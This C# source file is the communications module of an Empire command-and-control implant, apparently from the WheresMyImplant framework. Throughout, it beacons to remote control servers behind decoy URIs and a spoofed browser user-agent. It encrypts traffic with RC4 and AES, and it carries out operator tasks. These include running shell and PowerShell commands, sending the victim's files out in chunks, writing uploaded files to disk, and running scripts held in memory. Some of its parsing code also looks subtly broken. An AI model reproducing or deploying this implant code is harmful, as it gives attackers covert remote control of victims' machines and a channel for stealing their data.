using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

using WheresMyImplant;

namespace Empire
{
    class Coms : Base
    {
        private String sessionId {get; set;}
        private String stagingKey {get; set;}
        private Byte[] stagingKeyBytes {get; set;}
        private String sessionKey { get; set; }
        private Byte[] sessionKeyBytes { get; set; }

        internal Int32 agentDelay {get; set;}
        internal Int32 agentJitter { get; set; }
        internal Int32 sleepTime { get; set; }

        internal Int32 missedCheckins { get; set; }
        internal Int32 lostLimit { get; set; }

        private Int32 ServerIndex = 0;
        private String[] controlServers { get; set; }

        private String[] taskURIs = { "/admin/get.php", "/news.php", "/login/process.php" };
        private String userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

        private JobTracking jobTracking;

        internal Coms(String sessionId, String stagingKey, String sessionKey, String[] controlServers)
        {
            this.sessionId = sessionId;
            this.stagingKey = stagingKey;
            this.sessionKey = sessionKey;
            stagingKeyBytes = Encoding.ASCII.GetBytes(stagingKey);
            sessionKeyBytes = Encoding.ASCII.GetBytes(sessionKey);

            this.controlServers = controlServers;

            agentDelay = 5;
            agentJitter = 1;
            sleepTime = 0;

            missedCheckins = 0;
            lostLimit = 50;
        }

        ////////////////////////////////////////////////////////////////////////////////
        private byte[] newRoutingPacket(byte[] encryptedBytes, Int32 meta)
        {
            Int32 encryptedBytesLength = 0;
            if (encryptedBytes != null && encryptedBytes.Length > 0)
            {
                encryptedBytesLength = encryptedBytes.Length;
            }

            byte[] data = Encoding.ASCII.GetBytes(sessionId);
            data = Misc.Combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
            data = Misc.Combine(data, BitConverter.GetBytes(encryptedBytesLength));

            byte[] initializationVector = newInitializationVector(4);
            byte[] rc4Key = Misc.Combine(initializationVector, stagingKeyBytes);
            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);

            routingPacketData = Misc.Combine(initializationVector, routingPacketData);
            if (encryptedBytes != null && encryptedBytes.Length > 0)
            {
                routingPacketData = Misc.Combine(routingPacketData, encryptedBytes);
            }

            return routingPacketData;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void decodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
        {
            this.jobTracking = jobTracking;

            if (packetData.Length < 20)
            {
                return;
            }
            Int32 offset = 0;
            while (offset < packetData.Length)
            {
                byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
                byte[] routingInitializationVector = routingPacket.Take(4).ToArray();
                byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
                offset += 20;

                byte[] rc4Key = Misc.Combine(routingInitializationVector, stagingKeyBytes);

                byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
                String packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                try
                {
                    byte language = routingPacket[8];
                    byte metaData = routingPacket[9];
                }
                catch (IndexOutOfRangeException error)
                {
                    WriteOutputBad(error.ToString());
                }
                byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                UInt32 packetLength = BitConverter.ToUInt32(routingData, 12);

                if (packetLength < 0)
                {
                    break;
                }

                if (sessionId == packetSessionId)
                {
                    byte[] encryptedData = packetData.Skip(offset).Take(offset + (Int32)packetLength - 1).ToArray();
                    offset += (Int32)packetLength;
                    try
                    {
                        processTaskingPackets(encryptedData);
                    }
                    catch (Exception error)
                    {
                        WriteOutputBad(error.ToString());
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] getTask()
        {
            byte[] results = new byte[0];
            try
            {
                Byte[] routingPacket = newRoutingPacket(null, 4);
                String routingCookie = Convert.ToBase64String(routingPacket);

                WebClient webClient = new WebClient();

                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Headers.Add("User-Agent", userAgent);
                webClient.Headers.Add("Cookie", "session=" + routingCookie);

                Random random = new Random();
                String selectedTaskURI = taskURIs[random.Next(0, taskURIs.Length)];
                results = webClient.DownloadData(controlServers[ServerIndex] + selectedTaskURI);
            }
            catch (WebException webException)
            {
                missedCheckins++;
                if ((Int32)((HttpWebResponse)webException.Response).StatusCode == 401)
                {
                    //Restart everything
                }
            }
            return results;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void sendMessage(byte[] packets)
        {
            Byte[] ivBytes = newInitializationVector(16);
            Byte[] encryptedBytes = new byte[0];
            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
            {
                aesCrypto.Mode = CipherMode.CBC;
                aesCrypto.Key = sessionKeyBytes;
                aesCrypto.IV = ivBytes;
                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
            }
            encryptedBytes = Misc.Combine(ivBytes, encryptedBytes);

            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = sessionKeyBytes;
            Byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
            encryptedBytes = Misc.Combine(encryptedBytes, hmacBytes);

            Byte[] routingPacket = newRoutingPacket(encryptedBytes, 5);

            Random random = new Random();
            String controlServer = controlServers[random.Next(controlServers.Length)];

            if (controlServer.StartsWith("http"))
            {
                WebClient webClient = new WebClient();
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Headers.Add("User-Agent", userAgent);
                //Add custom headers
                try
                {
                    String taskUri = taskURIs[random.Next(taskURIs.Length)];
                    Byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                }
                catch (WebException error)
                {
                    WriteOutputBad(error.ToString());
                }
            }

        }

        ////////////////////////////////////////////////////////////////////////////////
        private void processTaskingPackets(byte[] encryptedTask)
        {
            byte[] taskingBytes = EmpireStager.aesDecrypt(sessionKey, encryptedTask);
            PACKET firstPacket = decodePacket(taskingBytes, 0);
            byte[] resultPackets = processTasking(firstPacket);
            sendMessage(resultPackets);

            Int32 offset = 12 + (Int32)firstPacket.length;
            String remaining = firstPacket.remaining;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //The hard part
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] processTasking(PACKET packet)
        {
            byte[] returnPacket = new byte[0];
            try
            {
                //Change this to a switch : case
                Int32 type = packet.type;
                switch (type)
                {
                    case 1:
                        byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
                        String systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
                        return encodePacket(1, systemInformation, packet.taskId);
                    case 2:
                        String message = "[!] Agent " + sessionId + " exiting";
                        sendMessage(encodePacket(2, message, packet.taskId));
                        Environment.Exit(0);
                        //This is still dumb
                        return new byte[0];
                    case 40:
                        String[] parts = packet.data.Split(' ');
                        String output;
                        if (parts.Length == 1)
                        {
                            output = Agent.invokeShellCommand(parts[0], "");
                        }
                        else
                        {
                            output = Agent.invokeShellCommand(parts[0], parts[1]);
                        }
                        byte[] packetBytes = encodePacket(packet.type, output, packet.taskId);
                        return packetBytes;
                    case 41:
                        return task41(packet);
                    case 42:
                        return task42(packet);
                    case 50:
                        List<String> runningJobs = new List<String>(jobTracking.jobs.Keys);
                        return encodePacket(packet.type, runningJobs.ToArray(), packet.taskId);
                    case 51:
                        return task51(packet);
                    case 100:
                        return encodePacket(packet.type, Agent.runPowerShell(packet.data), packet.taskId);
                    case 101:
                        return task101(packet);
                    case 110:
                        String jobId = jobTracking.startAgentJob(packet.data);
                        return encodePacket(packet.type, "Job started: " + jobId, packet.taskId);
                    case 111:
                        return encodePacket(packet.type, "Not Implimented", packet.taskId);
                    case 120:
                        return task120(packet);
                    case 121:
                        return task121(packet);
                    default:
                        return encodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                }
            }
            catch (Exception error)
            {
                return encodePacket(packet.type, "Error running command: " + error, packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] encodePacket(UInt16 type, String[] data, UInt16 resultId)
        {
            String dataString = String.Join("\n", data);
            return encodePacket(type, dataString, resultId);
        }

        // Check this one for UTF8 Errors
        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] encodePacket(UInt16 type, String data, UInt16 resultId)
        {
            data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
            byte[] packet = new Byte[12 + data.Length];

            BitConverter.GetBytes((Int16)type).CopyTo(packet, 0);

            BitConverter.GetBytes((Int16)1).CopyTo(packet, 2);
            BitConverter.GetBytes((Int16)1).CopyTo(packet, 4);

            BitConverter.GetBytes((Int16)resultId).CopyTo(packet, 6);

            BitConverter.GetBytes(data.Length).CopyTo(packet, 8);
            Encoding.UTF8.GetBytes(data).CopyTo(packet, 12);

            return packet;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct PACKET
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            internal UInt16 type;
            internal UInt16 totalPackets;
            internal UInt16 packetNumber;
            internal UInt16 taskId;
            internal UInt32 length;
            internal String data;
            internal String remaining;
        };

        ////////////////////////////////////////////////////////////////////////////////
        private PACKET decodePacket(Byte[] packet, Int32 offset)
        {
            PACKET packetStruct = new PACKET();
            packetStruct.type = BitConverter.ToUInt16(packet, 0 + offset);
            packetStruct.totalPackets = BitConverter.ToUInt16(packet, 2 + offset);
            packetStruct.packetNumber = BitConverter.ToUInt16(packet, 4 + offset);
            packetStruct.taskId = BitConverter.ToUInt16(packet, 6 + offset);
            packetStruct.length = BitConverter.ToUInt32(packet, 8 + offset);
            Int32 takeLength = 12 + (Int32)packetStruct.length + offset - 1;
            Byte[] dataBytes = packet.Skip(12 + offset).Take(takeLength).ToArray();
            packetStruct.data = Encoding.UTF8.GetString(dataBytes);
            Byte[] remainingBytes = packet.Skip(takeLength).Take(packet.Length - takeLength).ToArray();
            packet = null;
            return packetStruct;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] newInitializationVector(Int32 length)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[length];
            for (Int32 i = 0; i < initializationVector.Length; i++)
            {
                initializationVector[i] = Convert.ToByte(random.Next(0, 255));
            }
            return initializationVector;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] task41(PACKET packet)
        {
            try
            {
                Int32 chunkSize = 512 * 1024;
                String[] packetParts = packet.data.Split(' ');
                String path = "";
                if (packetParts.Length > 1)
                {
                    path = String.Join(" ", packetParts.Take(packetParts.Length - 2).ToArray());
                    try
                    {
                        chunkSize = Convert.ToInt32(packetParts[packetParts.Length - 1]) / 1;
                        if (packetParts[packetParts.Length - 1].Contains('b'))
                        {
                            chunkSize = chunkSize * 1024;
                        }
                    }
                    catch
                    {
                        path += " " + packetParts[packetParts.Length - 1];
                    }
                }
                else
                {
                    path = packet.data;
                }
                path = path.Trim('\"').Trim('\'');
                if (chunkSize < 64 * 1024)
                {
                    chunkSize = 64 * 1024;
                }
                else if (chunkSize > 8 * 1024 * 1024)
                {
                    chunkSize = 8 * 1024 * 1024;
                }


                DirectoryInfo directoryInfo = new DirectoryInfo(path);
                FileInfo[] completePath = directoryInfo.GetFiles(path);

                Int32 index = 0;
                String filePart = "";
                do
                {
                    byte[] filePartBytes = Agent.getFilePart(path, index, chunkSize);
                    filePart = Convert.ToBase64String(filePartBytes);
                    if (filePart.Length > 0)
                    {
                        String data = index.ToString() + "|" + path + "|" + filePart;
                        sendMessage(encodePacket(packet.type, data, packet.taskId));
                        index++;
                        if (agentDelay != 0)
                        {
                            Int32 max = (agentJitter + 1) * agentDelay;
                            if (max > Int32.MaxValue)
                            {
                                max = Int32.MaxValue - 1;
                            }

                            Int32 min = (agentJitter - 1) * agentDelay;
                            if (min < 0)
                            {
                                min = 0;
                            }

                            if (min == max)
                            {
                                sleepTime = min;
                            }
                            else
                            {
                                Random random = new Random();
                                sleepTime = random.Next(min, max);
                            }
                            Thread.Sleep(sleepTime);
                        }
                        GC.Collect();
                    }
                } while (filePart.Length != 0);
                return encodePacket(packet.type, "[*] File download of " + path + " completed", packet.taskId);
            }
            catch
            {
                return encodePacket(packet.type, "[!] File does not exist or cannot be accessed", packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        private Byte[] task42(PACKET packet)
        {
            String[] parts = packet.data.Split('|');
            String fileName = parts[0];
            String base64Part = parts[1];
            byte[] content = Convert.FromBase64String(base64Part);
            try
            {
                using (FileStream fileStream = File.Open(fileName, FileMode.Create))
                {
                    using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                    {
                        try
                        {
                            binaryWriter.Write(content);
                            return encodePacket(packet.type, "[*] Upload of $fileName successful", packet.taskId);
                        }
                        catch
                        {
                            return encodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
                        }
                    }
                }
            }
            catch
            {
                return encodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        private Byte[] task51(PACKET packet)
        {
            try
            {
                String output = jobTracking.jobs[packet.data].getOutput();
                if (output.Trim().Length > 0)
                {
                    encodePacket(packet.type, output, packet.taskId);
                }
                jobTracking.jobs[packet.data].killThread();
                return encodePacket(packet.type, "Job " + packet.data + " killed.", packet.taskId);
            }
            catch
            {
                return encodePacket(packet.type, "[!] Error in stopping job: " + packet.data, packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] task101(Coms.PACKET packet)
        {
            String prefix = packet.data.Substring(0, 15);
            String extension = packet.data.Substring(15, 5);
            String output = Agent.runPowerShell(packet.data.Substring(20));
            return encodePacket(packet.type, prefix + extension + output, packet.taskId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] task120(Coms.PACKET packet)
        {
            Random random = new Random();
            Byte[] initializationVector = new Byte[16];
            random.NextBytes(initializationVector);
            jobTracking.importedScript = EmpireStager.aesEncrypt(sessionKeyBytes, initializationVector, Encoding.ASCII.GetBytes(packet.data));
            return encodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] task121(Coms.PACKET packet)
        {
            Byte[] scriptBytes = EmpireStager.aesDecrypt(sessionKey, jobTracking.importedScript);
            String script = Encoding.UTF8.GetString(scriptBytes);
            String jobId = jobTracking.startAgentJob(script + ";" + packet.data);
            return encodePacket(packet.type, "Job started: " + jobId, packet.taskId);
        }
    }
}